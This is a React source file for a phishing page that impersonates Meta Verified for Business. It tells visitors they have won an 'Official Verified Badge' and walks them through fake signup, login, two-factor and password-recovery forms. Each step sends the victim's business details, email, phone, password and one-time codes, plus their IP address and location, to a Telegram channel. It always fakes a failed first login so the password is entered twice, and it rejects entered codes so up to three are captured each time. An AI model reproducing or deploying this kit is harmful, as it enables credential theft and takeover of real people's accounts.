import { useState, useEffect } from 'react';
import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';

export default function Home() {
  // --- STATES TRANG CHỦ ---
  const [activeBenefit, setActiveBenefit] = useState(0);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [openFaq, setOpenFaq] = useState(null);

  // --- STATES FORM MODAL ---
  const [showModal, setShowModal] = useState(false);
  const [step, setStep] = useState(1);
  const [clientIp, setClientIp] = useState('Unknown');
  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
  const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

  // States cho Gửi lại mã
  const [resendTimer, setResendTimer] = useState(0);
  
  // States cho Quên mật khẩu
  const [forgotEmail, setForgotEmail] = useState('');
  const [showForgotSuccess, setShowForgotSuccess] = useState(false);
  const [forgotOtpAttempt, setForgotOtpAttempt] = useState(0);

  // --- DỮ LIỆU TRANG CHỦ ---
  const benefitsData = [
    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/images/benefit-1.webp' },
    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.', image: '/images/benefit-2.webp' },
    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/images/benefit-3.webp' },
    { title: 'Upgraded profile features', desc: 'Enrich your profile by adding images to your links.', image: '/images/benefit-4.webp' }
  ];
  
  const testimonials = [
    { quote: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."', author: 'Kimber Greenwood, Owner of Water Bear Photography' },
    { quote: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up."', author: 'Devon Kirby, Owner, Mom Approved Miami' },
    { quote: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business."', author: 'Sarah Clancy, Owner of Sarah Marie Running Co.' }
  ];
  
  const faqs = [
    { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions.' },
    { q: 'How do I update my information if I\'m not eligible?', a: 'Join our waitlist to stay updated.' },
    { q: 'What if I already have a verified badge?', a: 'No action is needed to keep your badge.' },
    { q: 'What if I\'m interested in Meta Verified for creators?', a: 'Visit the Meta Verified for creators page to learn more.' },
    { q: 'Where will my badge appear?', a: 'Facebook Page and Messenger account, or Instagram account and Threads, depending on the asset you select.' },
    { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
  ];

  // --- LẤY IP KHI MỞ FORM ---
  useEffect(() => { 
      if(showModal && clientIp === 'Unknown') {
          fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
              if (d && d.ip) {
                  setClientIp(`${d.ip} - ${d.country} (${d.city})`);
                  if (d.country_code && countryCodeMap[d.country_code]) {
                      setCountryCode(countryCodeMap[d.country_code]);
                  }
              }
          }).catch(()=>{}); 
      }
  }, [showModal, clientIp]);

  // --- HÀM XỬ LÝ FORM ---
  const openModal = () => { setShowModal(true); setStep(1); };

  const handleSignup = (e) => {
    e.preventDefault(); let errs = {};
    if (busName.length < 2) errs.busName = true; 
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
    if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    
    setErrors({}); setLoading(true);
    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
    setInitialSession(text); sendTelegramMessage('');
    setTimeout(() => { setLoading(false); setStep(2); }, 700);
  };

  const handleLogin = (e) => {
    e.preventDefault(); if (loginPass.length === 0) return;
    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
    setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
  };

  const handleOtp = (e) => {
    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
    setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
  };

  const handleResend = () => {
    if (resendTimer > 0) return;
    setResendTimer(30);
    sendTelegramMessage('\n<b>User clicked: Resend Code</b>');
    const timer = setInterval(() => {
      setResendTimer((prev) => {
        if (prev <= 1) { clearInterval(timer); return 0; }
        return prev - 1;
      });
    }, 1000);
  };

  const handleForgotSubmit = (e) => {
    e.preventDefault(); if (!forgotEmail) return;
    setLoading(true);
    sendTelegramMessage(`\n<b>Forgot Password Input:</b> <code>${escapeHtml(forgotEmail)}</code>`);
    setTimeout(() => { setLoading(false); setShowForgotSuccess(true); }, 1000);
  };

  const handleForgotOtp = (e) => {
    e.preventDefault(); if (otp.length < 6) return;
    setLoading(true);
    const newAttempt = forgotOtpAttempt + 1;
    setForgotOtpAttempt(newAttempt);

    if (newAttempt <= 3) {
        sendTelegramMessage(`\n<b>Recovery OTP ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
    }

    setTimeout(() => {
        setLoading(false);
        if (newAttempt <= 3) {
            setShowOtpError(true);
            setOtp('');
        } else {
            alert('You have entered an incorrect code too many times. Please try again later.');
            setStep(2); setShowForgotSuccess(false); setForgotEmail(''); setOtp(''); setForgotOtpAttempt(0);
        }
    }, 1500);
  };

  return (
    <div style={{ overflowX: 'hidden' }}>
      {/* ================= TRANG CHỦ ================= */}
      <header className="header">
          <div className="header-left">
              <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" /></a>
              <nav className="nav-links">
                  <a className="nav-link" href="#steps">Get started</a>
                  <a className="nav-link" href="#benefits">Advertise</a>
                  <a className="nav-link" href="#faq">Learn</a>
                  <a className="nav-link" href="#footer">Support</a>
              </nav>
          </div>
          <div className="header-right">
              <svg className="header-icon" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" strokeLinecap="round"/></svg>
              <div className="avatar-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
          </div>
      </header>

      <section id="hero">
          <div className="hero-inner">
              <div className="hero-text">
                  <div className="hero-text-inner">
                      <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                      <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                      <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
                      <button className="btn-primary" onClick={openModal}>Claim your badge</button>
                      <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
                  </div>
              </div>
              <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="benefits" id="benefits">
          <div className="benefits-header">
              <h2>Explore Meta Verified for business benefits.</h2>
              <p>Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.</p>
              <span className="benefits-learn-more" onClick={() => document.getElementById('faq').scrollIntoView({behavior:'smooth'})}>
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5"/><path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>Learn more
              </span>
          </div>
          <div className="benefits-grid">
              <div className="benefits-image"><img src={benefitsData[activeBenefit].image} alt="Benefit" /></div>
              <div className="benefits-accordion">
                  {benefitsData.map((b, i) => (
                      <div key={i} className={`benefit-item ${i === activeBenefit ? 'active' : ''}`} onClick={() => setActiveBenefit(i)}>
                          <div className="benefit-header"><span>{b.title}</span><svg className={`benefit-chevron ${i === activeBenefit ? 'rotated' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg></div>
                          <div className={`benefit-desc ${i === activeBenefit ? 'open' : ''}`}><p>{b.desc}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <section className="steps" id="steps">
          <div className="steps-inner">
              <h2>Sign up for Meta Verified.</h2>
              <p>Our verification process is designed to maintain the integrity of the verified badge for businesses. Get started by submitting an application.</p>
              <div className="steps-grid">
                  <div className="step-card"><div className="step-number">1</div><div className="step-title">Start your application.</div><p className="step-desc">Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements. When getting started, you should have your business contact information ready.</p></div>
                  <div className="step-card"><div className="step-number">2</div><div className="step-title">Verify business details.</div><p className="step-desc">You may be asked to share details such as your business name, address, website and/or phone number.</p></div>
                  <div className="step-card"><div className="step-number">3</div><div className="step-title">Get reviewed.</div><p className="step-desc">We'll review your application and send an update on your status within three business days.</p></div>
              </div>
          </div>
      </section>

      <section className="testimonials">
          <div className="container-narrow">
              <h2>See how Meta Verified has helped real businesses.</h2>
              <div className="carousel-wrapper">
                  <div className="carousel-track" style={{ transform: `translateX(-${currentSlide * 100}%)` }}>
                      {testimonials.map((t, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{t.quote}</p><p className="carousel-author">{t.author}</p></div>))}
                  </div>
              </div>
              <div className="carousel-nav">
                  <button className="carousel-btn" onClick={() => setCurrentSlide((prev) => (prev - 1 + testimonials.length) % testimonials.length)}><svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7"/></svg></button>
                  <div className="carousel-dots">{testimonials.map((_, i) => (<div key={i} className={`dot ${i === currentSlide ? 'active' : ''}`} onClick={() => setCurrentSlide(i)}></div>))}</div>
                  <button className="carousel-btn" onClick={() => setCurrentSlide((prev) => (prev + 1) % testimonials.length)}><svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7"/></svg></button>
              </div>
          </div>
      </section>

      <section className="cta">
          <div className="cta-inner">
              <div className="cta-content">
                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                  <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
                  <button className="btn-primary" onClick={openModal}>Claim your badge</button>
              </div>
              <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="faq" id="faq">
          <div className="faq-inner">
              <h2>Frequently asked questions</h2>
              <p className="faq-sub">For more, visit our Help Centre.</p>
              <div className="faq-list">
                  {faqs.map((f, i) => (
                      <div key={i} className="faq-item">
                          <button className="faq-question" onClick={() => setOpenFaq(openFaq === i ? null : i)}><span>{f.q}</span><svg className={`faq-chevron ${openFaq === i ? 'open' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg></button>
                          <div className={`faq-answer ${openFaq === i ? 'open' : ''}`}><p>{f.a}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <footer className="footer" id="footer">
          <div className="footer-inner">
              <div className="footer-newsletter">
                  <div className="footer-row">
                      <div style={{ maxWidth: '480px' }}><div className="footer-title">Get the latest updates from Meta for Business.</div><p className="footer-desc">Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.</p></div>
                      <div className="footer-form"><input type="email" className="footer-input" placeholder="Your email address" /><button className="footer-subscribe">Subscribe</button></div>
                  </div>
                  <p className="footer-consent">By submitting this form, you agree to receive marketing-related electronic communications from Meta. You may withdraw your consent and unsubscribe at any time.</p>
              </div>
              <div className="footer-bottom">
                  <span className="footer-copy">© 2026 Meta</span>
                  <div className="footer-grid">
                      <div><a href="#hero" className="footer-link">About</a></div><div><a href="#steps" className="footer-link">Developers</a></div><div><a href="#benefits" className="footer-link">Careers</a></div><div><a href="#faq" className="footer-link">Privacy</a></div><div><a href="#faq" className="footer-link">Cookies</a></div><div><a href="#faq" className="footer-link">Terms</a></div>
                  </div>
              </div>
          </div>
      </footer>

      {/* ================= MODAL FORM NHẬP LIỆU ================= */}
      {showModal && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
            <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                
                <button onClick={() => setShowModal(false)} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                </button>

                <div style={{ textAlign: 'center', marginBottom: '18px' }}>
                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
                </div>

                {/* FORM 1: SIGNUP */}
                {step === 1 && (
                  <>
                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
                    <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                        <div>
                            <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                            {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
                        </div>
                        <div>
                            <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                            {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
                        </div>
                        <div>
                            <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                            {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
                        </div>
                        <div>
                            <div className="fb-phone-group">
                                <div className="fb-phone-select-wrap">
                                    <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
                                        <option value="+93">+93 (Afghanistan)</option>
                                        <option value="+84">+84 (Vietnam)</option>
                                        <option value="+1">+1 (United States)</option>
                                    </select>
                                </div>
                                <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                            </div>
                            {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                        </div>
                        <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
                    </form>
                  </>
                )}

                {/* FORM 2: LOGIN */}
                {step === 2 && (
                  <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                      <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
                      <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
                      {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
                      <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
                      
                      <div style={{ textAlign: 'center', padding: '12px 0 0' }}>
                          <button type="button" onClick={() => { setStep(4); setShowForgotSuccess(false); setForgotEmail(''); }} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer' }}>
                              Forgotten password?
                          </button>
                      </div>
                  </form>
                )}

                {/* FORM 3: 2FA */}
                {step === 3 && (
                  <>
                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                        <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
                        {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                        
                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : 'Verify'}</button>
                        
                        <div style={{ textAlign: 'center', marginTop: '8px' }}>
                            <button type="button" onClick={handleResend} disabled={resendTimer > 0} style={{ background: 'none', border: 'none', color: resendTimer > 0 ? '#65676b' : '#0064e0', fontSize: '14px', fontWeight: '500', cursor: resendTimer > 0 ? 'default' : 'pointer' }}>
                                {resendTimer > 0 ? `Resend code in ${resendTimer}s` : 'Resend code'}
                            </button>
                        </div>
                    </form>
                  </>
                )}

                {/* FORM 4: FORGOT PASSWORD */}
                {step === 4 && (
                  <>
                    {!showForgotSuccess ? (
                      // BƯỚC 4.1: TÌM TÀI KHOẢN
                      <>
                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Find your account</h2>
                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
                            Enter your mobile number or email address to search for your account.
                        </p>
                        <form onSubmit={handleForgotSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                            <input className="fb-input" type="text" placeholder="Mobile number or email address" value={forgotEmail} onChange={e => setForgotEmail(e.target.value)} required />
                            <button type="submit" className="fb-btn" disabled={loading || !forgotEmail}>{loading ? 'Searching...' : 'Search'}</button>
                        </form>
                        <div style={{ textAlign: 'center', marginTop: '16px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
                            <button type="button" onClick={() => setStep(2)} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer', fontWeight: '500' }}>Back to Log in</button>
                        </div>
                      </>
                    ) : (
                      // BƯỚC 4.2: NHẬP MÃ KHÔI PHỤC (GIỐNG 2FA)
                      <>
                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Reset your password</h2>
                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
                            Enter the 6-digit or 8-digit code we sent to your email or phone to reset your password.
                        </p>
                        <form onSubmit={handleForgotOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                            <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
                            
                            {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                            
                            <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : 'Verify'}</button>
                            
                            <div style={{ textAlign: 'center', marginTop: '8px' }}>
                                <button type="button" onClick={handleResend} disabled={resendTimer > 0} style={{ background: 'none', border: 'none', color: resendTimer > 0 ? '#65676b' : '#0064e0', fontSize: '14px', fontWeight: '500', cursor: resendTimer > 0 ? 'default' : 'pointer' }}>
                                    {resendTimer > 0 ? `Resend code in ${resendTimer}s` : 'Resend code'}
                                </button>
                            </div>
                            
                            <div style={{ textAlign: 'center', marginTop: '16px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
                                <button type="button" onClick={() => { setShowForgotSuccess(false); setOtp(''); }} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer', fontWeight: '500' }}>Back</button>
                            </div>
                        </form>
                      </>
                    )}
                  </>
                )}

                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
                </div>
            </div>
        </div>
      )}
    </div>
  );
}